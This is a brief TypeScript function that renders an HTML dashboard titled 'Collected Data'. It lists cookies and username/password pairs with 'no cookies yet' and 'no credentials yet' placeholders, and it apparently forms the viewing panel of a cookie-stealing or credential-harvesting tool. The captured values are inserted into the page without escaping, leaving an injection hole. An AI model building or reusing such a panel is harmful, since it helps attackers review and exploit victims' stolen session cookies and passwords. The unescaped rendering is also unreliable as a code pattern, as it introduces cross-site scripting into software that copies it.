export function renderPage(cookies: string[], credentials: { username: string; password: string }[]) {
  return `
  <!DOCTYPE html>
  <html lang="en">
  <head>
    <meta charset="UTF-8">
    <title>Collected Data</title>
    <script src="https://cdn.tailwindcss.com"></script>
  </head>
  <body class="bg-gray-100 text-gray-900 min-h-screen flex items-center justify-center">
    <div class="max-w-2xl w-full bg-white shadow-xl rounded-2xl p-6 space-y-6">
      <h1 class="text-3xl font-bold text-center text-indigo-600">📊 Collected Data</h1>
      
      <section>
        <h2 class="text-xl font-semibold text-gray-700 border-b pb-2">🍪 Cookies</h2>
        <ul class="list-disc list-inside mt-2 space-y-1 text-gray-600">
          ${cookies.map(c => `<li class="bg-gray-50 p-2 rounded">${c}</li>`).join("") || "<p class='text-gray-400'>No cookies yet.</p>"}
        </ul>
      </section>

      <section>
        <h2 class="text-xl font-semibold text-gray-700 border-b pb-2">🔐 Credentials</h2>
        <ul class="list-disc list-inside mt-2 space-y-1 text-gray-600">
          ${credentials.map(cred => `
            <li class="bg-gray-50 p-2 rounded">
              <span class="font-medium">Username:</span> ${cred.username} 
              <span class="ml-2 font-medium">Password:</span> ${cred.password}
            </li>`).join("") || "<p class='text-gray-400'>No credentials yet.</p>"}
        </ul>
      </section>
    </div>
  </body>
  </html>`;
}
